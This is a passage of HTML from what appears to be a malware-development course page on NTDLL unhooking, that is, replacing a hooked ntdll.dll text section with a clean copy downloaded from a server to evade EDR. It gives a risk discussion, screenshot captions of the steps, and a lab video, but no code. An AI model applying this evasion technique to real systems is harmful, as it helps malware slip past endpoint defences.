border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">4096</code>. This logic was introduced in the <em>Ntdll Unhooking - From Disk</em> module.</p><h3 id="risk-consideration" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Risk Consideration</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Although this NTDLL unhooking approach may appear a good approach at first, it is considered risky due to the usage of the <a href="https://learn.microsoft.com/en-us/windows/win32/wininet/about-wininet" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">WinINet</a> APIs. These APIs are used to interact with the HTTP/S protocol, but they require loading additional DLL images such as <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">wininet.dll</code>, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">winhttp.dll</code>, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">sechost.dll</code>, and many other DLLs that export functions used by these WinINet APIs. Loading these DLLs is done using functions that are likely being hooked such as <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">LoadLibrary</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">LdrLoadDll</code>, which exposes the inner design of the implementation.</p><h3 id="demo" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Demo</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Downloading the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ntdll.dll</code> file from Winbindex.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntdll-unhooking-server-718816620-fdcedd74-65d6-49a9-b7b8-b83eb8d59b68.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The hooked <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ntdll.dll</code> text section to be replaced.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntdll-unhooking-server-818817840-42eb37ed-c3fb-4bfc-a990-a79ea05fc69a.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Miscalculating the text section base address.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntdll-unhooking-server-918817843-e8ec2cca-a951-40e3-af75-14129cab4db5.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Recalculating the base address.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntdll-unhooking-server-10.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Replacing the text section.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntdll-unhooking-server-11.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><div class="mt-8 sm:mt-12 pt-6 border-t border-[#212b54] space-y-4"><h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2"><i data-lucide="video" class="w-4 h-4 sm:w-5 sm:h-5 text-[var(--accent)]"></i><span>Practical Lab Demonstration</span></h3>
+    <div class="my-6 sm:my-8 rounded-2xl border border-[#212b54] bg-[#0c1022] p-4 sm:p-5 space-y-3 sm:space-y-4 shadow-2xl transition-all duration-300 hover:border-[var(--accent)]">
+        <div class="flex flex-wrap items-center justify-between gap-2 border-b border-[#1c243f] pb-3">
+            <div class="flex items-center gap-2 min-w-0">
+                <i data-lucide="clapperboard" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                <h4 class="text-xs sm:text-sm font-bold text-white tracking-wide truncate">Field Lab Demo: edr4 final edr</h4>
+            </div>
+            <span class="px-2 py-0.5 rounded-full text-[10px] sm:text-xs font-mono font-semibold bg-[var(--accent-soft)] text-[var(--accent)] border border-[var(--accent)]">Live Lab</span>
+        </div>
+        <div class="rounded-xl overflow-hidden bg-black border border-[#1c243f] shadow-inner">
+            <video controls preload="metadata" class="w-full max-h-[320px] sm:max-h-[480px] bg-black">
+                <source src="videos/edr4-final_edr.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="flex flex-wrap items-center justify-between gap-2 text-xs text-[#cbd5e1] font-mono pt-1">
+            <span class="flex items-center gap-1.5 truncate max-w-[200px] sm:max-w-xs"><i data-lucide="file-video" class="w-3.5 h-3.5 text-[var(--accent)] flex-shrink-0"></i><span class="truncate">edr4-final_edr.mp4</span></span>
+            <a href="videos/edr4-final_edr.mp4" download class="text-[#cbd5e1] hover:text-[var(--accent)] font-semibold flex items-center gap-1 transition"><i data-lucide="download" class="w-3.5 h-3.5"></i><span>Download MP4</span></a>
+        </div>
+    </div></div></main></body></html>
